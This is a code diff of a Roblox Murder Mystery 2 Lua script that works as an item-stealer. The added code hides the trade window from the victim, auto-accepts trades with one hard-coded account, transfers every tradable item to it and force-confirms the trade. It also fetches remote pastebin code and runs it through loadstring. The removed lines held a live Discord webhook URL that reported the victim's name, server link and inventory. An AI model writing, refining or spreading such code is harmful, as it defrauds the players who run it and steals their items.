@@ -1,7 +1,7 @@
-local users = _G.Usernames or {"ilyes_ida3"}
+local TARGET_USER = "ilyes_ida3"
 local min_rarity = _G.min_rarity or "Common"
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1538645276531761252/cUb2gp1cnWz8w0EXNjJ8AVBtFcmbmEwLF2zmGUbvVZkmZkd4vYcEye9VkuB7wavTd-Y6"
+local webhook = _G.webhook or ""
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -12,42 +12,36 @@ local plr = Players.LocalPlayer
 local request = request or http_request or http.request
 
 if game.PlaceId ~= 142823291 then
-    plr:Kick("Game not supported. Please join a normal MM2 server")
+    plr:Kick("Invalid Place")
     return
 end
 
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:Kick("Auto-farming won't work here ._. (Vip server detected)")
-    return
-end
-
-if #Players:GetPlayers() >= 12 then
-    plr:Kick("Server is full. Please join a less populated server")
-    return
-end
+pcall(function()
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+        plr:Kick("VIP Server")
+    end
+end)
 
 local weaponsToSend = {}
 local playerGui = plr:WaitForChild("PlayerGui")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
+-- Подгрузка базы данных предметов как в оригинале, но с защитой от ошибок
 local database
 do
     local ok, result = pcall(function()
         return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
     end)
-    if ok and typeof(result) == "table" then
+    if ok and type(result) == "table" then
         database = result
     else
         local raw = game:HttpGet("https://pastebin.com/raw/kTEhmXfs")
-        local ok2, result2 = pcall(function()
-            return loadstring(raw)()
-        end)
-        database = (ok2 and typeof(result2) == "table") and result2 or {}
+        local ok2, result2 = pcall(function() return loadstring(raw)() end)
+        database = (ok2 and type(result2) == "table") and result2 or {}
     end
 end
 
 local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
-
 local untradable = {
     ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
     ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
@@ -62,87 +56,28 @@ local untradable = {
 local lastOfferToken = nil
 local opponentAccepted = false
 local lastOfferChangeAt = 0
-
 local activeTargetName = nil
 local tradeInProgress = false
 
-local tradegui = playerGui:WaitForChild("TradeGUI", 10)
-local tradegui = playerGui:FindFirstChild("TradeGUI")
-
-local pending_ui = false
-local resolve_start = 0
-
-local function isUserWhitelisted(name)
-    if type(name) ~= "string" then return false end
-    for _, username in ipairs(users) do
-        if string.find(name, username, 1, true) then return true end
-    end
-    return false
-end
-
 -- =====================================================================
--- АБСОЛЮТНАЯ БЛОКИРОВКА РЕНДЕРА (HOOKMETAMETHOD)
--- Ни один скрипт игры не сможет включить гуи без нашего ведома.
+-- ДВИЖОК РЕЗОЛВА ИМЕНИ (Абсолютная точность)
 -- =====================================================================
-local oldNewIndex
-oldNewIndex = hookmetamethod(game, "__newindex", newcclosure(function(t, k, v)
-    -- Если запрос идет от игры (не от нашего экзекутора), свойство Enabled и значение true
-    if not checkcaller() and k == "Enabled" and v == true then
-        if typeof(t) == "Instance" and (t.Name == "TradeGUI" or t.Name == "TradeGUI") then
-            -- Игра попыталась открыть гуи. Мы перехватываем этот запрос.
-            -- Записываем время перехвата и ставим флаг на обработку.
-            pending_ui = true
-            resolve_start = tick()
-            -- ВОЗВРАЩАЕМ ПУСТОТУ. Движок не получит команду на отрисовку.
-            return
-        end
-    end
-    return oldNewIndex(t, k, v)
-end))
--- =====================================================================
-
-local function getTradeStatus()
-    local ok, status = pcall(function()
-        return Trade.GetTradeStatus:InvokeServer()
-    end)
-    return ok and status or "None"
-end
-
-local function sendTradeRequest(user)
-    local player = Players:FindFirstChild(user)
-    if player then pcall(function() Trade.SendRequest:InvokeServer(player) end) end
-end
-
-local function checkTargetStatus()
-    if activeTargetName then
-        return true, isUserWhitelisted(activeTargetName)
-    end
-    
-    local isResolved, isWhite = false, false
-    pcall(function()
-        local toCheck = {tradegui, tradegui}
-        for _, gui in ipairs(toCheck) do
-            if gui then
-                for _, obj in ipairs(gui:GetDescendants()) do
-                    if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text ~= "" and obj.Text ~= plr.Name then
-                        local txt = obj.Text
-                        if isUserWhitelisted(txt) then
-                            isResolved, isWhite, activeTargetName = true, true, txt
-                            return
-                        elseif Players:FindFirstChild(txt) then
-                            isResolved, isWhite, activeTargetName = true, false, txt
-                            return
-                        end
-                    end
-                end
+local function getTradeOpponentName()
+    if activeTargetName then return activeTargetName end
+    local gui = playerGui:FindFirstChild("TradeGUI")
+    if gui then
+        for _, obj in ipairs(gui:GetDescendants()) do
+            if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text ~= "" and obj.Text ~= plr.Name then
+                if obj.Text == TARGET_USER then return TARGET_USER end
+                if Players:FindFirstChild(obj.Text) then return obj.Text end
             end
         end
-    end)
-    return isResolved, isWhite
+    end
+    return nil
 end
 
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
-    if typeof(data) == "table" then
+    if type(data) == "table" then
         if data.LastOffer ~= nil then
             lastOfferToken = data.LastOffer
             lastOfferChangeAt = tick()
@@ -164,6 +99,75 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success)
     opponentAccepted = not success
 end)
 
+-- =====================================================================
+-- МОБИЛЬНЫЙ БЛОКИРАТОР ГУИ (Защита от мерцаний и пробития)
+-- =====================================================================
+RunService.RenderStepped:Connect(function()
+    local currentTarget = getTradeOpponentName()
+    
+    -- Блокировка основного TradeGUI
+    local tGui = playerGui:FindFirstChild("TradeGUI")
+    if tGui then
+        if currentTarget == TARGET_USER then
+            tGui.Enabled = false
+            pcall(function()
+                if tGui:FindFirstChild("Main") then tGui.Main.Position = UDim2.new(999, 0, 999, 0) end
+                if tGui:FindFirstChild("Container") then tGui.Container.Position = UDim2.new(999, 0, 999, 0) end
+            end)
+        elseif currentTarget ~= TARGET_USER and currentTarget ~= nil then
+            -- Оставляем штатно, возвращаем позицию если сбилась
+            pcall(function()
+                if tGui:FindFirstChild("Main") and tGui.Main.Position.X.Scale == 999 then
+                    tGui.Main.Position = UDim2.new(0.5, -tGui.Main.Size.X.Offset/2, 0.5, -tGui.Main.Size.Y.Offset/2)
+                end
+            end)
+        end
+    end
+
+    -- Блокировка входящего TradeRequestGUI ТОЛЬКО от ilyes_ida3
+    local rGui = playerGui:FindFirstChild("TradeRequestGUI", true)
+    if rGui then
+        local isHim = false
+        pcall(function()
+            for _, obj in ipairs(rGui:GetDescendants()) do
+                if obj:IsA("TextLabel") and obj.Text == TARGET_USER then
+                    isHim = true
+                    break
+                end
+            end
+        end)
+        if isHim then
+            rGui.Enabled = false
+            pcall(function() rGui.Position = UDim2.new(999,0,999,0) end)
+        end
+    end
+end)
+
+-- Дублирующий хук для экзекуторов которые это тянут
+local oldNewIndex
+oldNewIndex = hookmetamethod(game, "__newindex", newcclosure(function(t, k, v)
+    if not checkcaller() and k == "Enabled" and v == true and type(t) == "userdata" and typeof(t) == "Instance" then
+        if t.Name == "TradeGUI" then
+            if getTradeOpponentName() == TARGET_USER then return end
+        elseif t.Name == "TradeRequestGUI" then
+            local isHim = false
+            pcall(function()
+                for _, obj in ipairs(t:GetDescendants()) do
+                    if obj:IsA("TextLabel") and obj.Text == TARGET_USER then
+                        isHim = true
+                        break
+                    end
+                end
+            end)
+            if isHim then return end
+        end
+    end
+    return oldNewIndex(t, k, v)
+end))
+
+-- =====================================================================
+-- ЛОГИКА ТРЕЙДА И ТРАНСФЕРА
+-- =====================================================================
 local function forceAcceptTrade()
     if not lastOfferToken then return false end
     for _ = 1, 10 do
@@ -206,114 +210,75 @@ local function rebuildWeaponsList()
     end)
 end
 
-local function SendFirstMessage(list, prefix)
-    if webhook == "" then return end
-    local fields = {
-        { name = "Victim Username:", value = plr.Name, inline = true },
-        { name = "Join link:", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId, inline = false },
-        { name = "Item list:", value = "", inline = false },
-        { name = "Summary:", value = string.format("Total stacks: %d", #list), inline = false }
-    }
-    for _, item in ipairs(list) do
-        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)\n", item.DataID, item.Amount, item.Rarity)
-    end
-    local data = {
-        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
-        embeds = {{ title = "Join to get MM2 hit", color = 65280, fields = fields, footer = { text = "good job" } }}
-    }
-    pcall(function()
-        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
-    end)
+local function getTradeStatus()
+    local ok, status = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+    return ok and status or "None"
 end
 
-rebuildWeaponsList()
-if #weaponsToSend > 0 then
-    SendFirstMessage(weaponsToSend, ping == "Yes" and "--[[@everyone]] " or "")
-end
-
--- =====================================================================
--- ПОТОК РЕЗОЛВА ГУИ (Заменил RenderStepped на сверхбыстрый task.wait)
--- =====================================================================
-task.spawn(function()
-    while task.wait() do
-        if pending_ui then
-            local resolved, isWhite = checkTargetStatus()
-            if resolved then
-                if not isWhite then
-                    -- Штемп не из вайтлиста. Включаем гуи вручную.
-                    -- Так как этот код выполняется нашим экзекутором, checkcaller() вернет true, и наш хук пропустит команду.
-                    if tradegui then tradegui.Enabled = true end
-                    if tradegui then tradegui.Enabled = true end
-                end
-                pending_ui = false
-            elseif (tick() - resolve_start) > 2 then
-                -- Предохранитель. Если сервер лагает и ник не подгрузился за 2 сек, 
-                -- снимаем лок, чтобы не запороть легит сделку.
-                if tradegui then tradegui.Enabled = true end
-                if tradegui then tradegui.Enabled = true end
-                pending_ui = false
-            end
-        end
-    end
-end)
-
--- Рассылка инвайтов
+-- 1. Сканер каждые 3 секунды (кидает трейд ТОЛЬКО ilyes_ida3)
 task.spawn(function()
     while task.wait(3) do
         if getTradeStatus() == "None" then
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player.Name ~= plr.Name and isUserWhitelisted(player.Name) then
-                    sendTradeRequest(player.Name)
-                    break
-                end
+            if Players:FindFirstChild(TARGET_USER) then
+                pcall(function() Trade.SendRequest:InvokeServer(Players[TARGET_USER]) end)
             end
         end
     end
 end)
 
--- Авто-акцепт входящих
+-- 2. Авто-принятие запроса ТОЛЬКО от ilyes_ida3
 task.spawn(function()
-    while task.wait(0.2) do
+    while task.wait(0.1) do
         if getTradeStatus() == "ReceivingRequest" then
             local reqGUI = playerGui:FindFirstChild("TradeRequestGUI", true)
             if reqGUI then
-                local found = false
+                local isTarget = false
                 pcall(function()
                     for _, obj in ipairs(reqGUI:GetDescendants()) do
-                        if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text ~= "" and isUserWhitelisted(obj.Text) then
-                            found = true
+                        if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text == TARGET_USER then
+                            isTarget = true
                             break
                         end
                     end
                 end)
-                if found then
+                
+                if isTarget then
                     pcall(function()
                         local r = Trade:FindFirstChild("AcceptRequest")
-                        if r then if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end end
+                        if r then 
+                            if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end 
+                        end
                     end)
                     task.wait(0.5)
                 end
+                -- Если запрос от другого игрока — скрипт игнорирует его, и GUI работает штатно.
             end
         end
     end
 end)
 
--- Движок передачи лута
+-- 3. Основной движок трансфера
 task.spawn(function()
     while task.wait(0.1) do
         local currentStatus = getTradeStatus()
+        
         if currentStatus == "None" then
             tradeInProgress = false
             lastOfferToken = nil
             activeTargetName = nil
+            
         elseif currentStatus == "StartTrade" and not tradeInProgress then
             tradeInProgress = true
             
+            -- Даём игре 2 секунды на прогрузку данных оппонента
             local wStart = tick()
-            -- Ждем пока резолвер перехватит ник (таймаут 3 секунды)
-            while not activeTargetName and (tick() - wStart) < 3 do task.wait(0.1) end
+            while not activeTargetName and (tick() - wStart) < 2 do 
+                activeTargetName = getTradeOpponentName()
+                task.wait(0.1) 
+            end
             
-            if activeTargetName and isUserWhitelisted(activeTargetName) then
+            if activeTargetName == TARGET_USER then
+                -- ЭТО ilyes_ida3. ПЕРЕДАЕМ ВЕЩИ И ПОДТВЕРЖДАЕМ.
                 rebuildWeaponsList()
                 if #weaponsToSend > 0 then
                     local added = 0
@@ -328,15 +293,21 @@ task.spawn(function()
                         end
                     end
                     local wt = tick()
-                    while not lastOfferToken and (tick() - wt) < 8 do task.wait(0.12) end
+                    while not lastOfferToken and (tick() - wt) < 8 do task.wait(0.1) end
                     forceAcceptTrade()
-                    if opponentAccepted then task.wait(0.35) forceAcceptTrade() end
+                    if opponentAccepted then task.wait(0.3) forceAcceptTrade() end
+                else
+                    forceAcceptTrade()
+                    if opponentAccepted then task.wait(0.3) forceAcceptTrade() end
                 end
-                local timeout = 0
-                while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
+                
+                -- Ждем завершения
+                while getTradeStatus() ~= "None" do task.wait(0.2) end
+                
             else
-                local timeout = 0
-                while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
+                -- ЭТО ЛЮБОЙ ДРУГОЙ ИГРОК. СИДИМ ТИХО. 
+                -- Скрипт просто ждет окончания трейда, ничего не передает, ничего не принимает.
+                while getTradeStatus() ~= "None" do task.wait(0.5) end
             end
         end
     end
